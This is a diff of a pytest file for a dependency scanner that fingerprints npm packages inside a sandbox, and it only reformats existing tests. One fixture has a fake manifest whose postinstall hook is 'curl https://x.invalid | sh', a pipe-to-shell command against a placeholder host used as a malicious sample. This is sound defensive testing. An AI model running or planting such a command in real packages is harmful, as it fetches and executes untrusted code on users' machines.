@@ -37,8 +37,10 @@ def test_docker_mode_runs_pinned_image_with_end_of_options(monkeypatch):
 
     def fake_run(cmd, **kwargs):
         captured["cmd"] = cmd
-        manifest = {"scripts": {"postinstall": "curl https://x.invalid | sh"},
-                    "dependencies": {"a": "1"}}
+        manifest = {
+            "scripts": {"postinstall": "curl https://x.invalid | sh"},
+            "dependencies": {"a": "1"},
+        }
         return subprocess.CompletedProcess(cmd, 0, stdout=json.dumps(manifest), stderr="")
 
     monkeypatch.setattr(sandbox, "docker_available", lambda: True)
@@ -54,15 +56,17 @@ def test_docker_mode_runs_pinned_image_with_end_of_options(monkeypatch):
 
 def test_docker_mode_without_docker_returns_none(monkeypatch):
     monkeypatch.setattr(sandbox, "docker_available", lambda: False)
-    monkeypatch.setattr(sandbox, "npm_fingerprint",
-                        lambda *a, **k: pytest.fail("must not fall back to the host"))
+    monkeypatch.setattr(
+        sandbox, "npm_fingerprint", lambda *a, **k: pytest.fail("must not fall back to the host")
+    )
     assert sandbox.fetch_fingerprint("left-pad", "1.3.0", mode="docker") is None
 
 
 def test_host_mode_uses_registry_api(monkeypatch):
     calls = []
-    monkeypatch.setattr(sandbox, "npm_fingerprint",
-                        lambda name, version, timeout: calls.append((name, version)))
+    monkeypatch.setattr(
+        sandbox, "npm_fingerprint", lambda name, version, timeout: calls.append((name, version))
+    )
     sandbox.fetch_fingerprint("left-pad", "1.3.0", mode="host")
     assert calls == [("left-pad", "1.3.0")]
 
@@ -81,8 +85,11 @@ def test_scanner_passes_sandbox_option_through(tmp_path, monkeypatch):
         modes.append(mode)
 
     monkeypatch.setattr(dependency_diff, "fetch_fingerprint", fake_fetch)
-    list(dependency_diff.DependencyDiffScanner().scan(
-        _ctx(tmp_path, {"ref": "main...HEAD", "sandbox": "docker"})))
+    list(
+        dependency_diff.DependencyDiffScanner().scan(
+            _ctx(tmp_path, {"ref": "main...HEAD", "sandbox": "docker"})
+        )
+    )
     assert modes == ["docker", "docker"]
 
     modes.clear()
@@ -92,5 +99,8 @@ def test_scanner_passes_sandbox_option_through(tmp_path, monkeypatch):
 
 def test_scanner_rejects_unknown_sandbox_mode(tmp_path):
     with pytest.raises(ValueError):
-        list(dependency_diff.DependencyDiffScanner().scan(
-            _ctx(tmp_path, {"ref": "main...HEAD", "sandbox": "vm"})))
+        list(
+            dependency_diff.DependencyDiffScanner().scan(
+                _ctx(tmp_path, {"ref": "main...HEAD", "sandbox": "vm"})
+            )
+        )
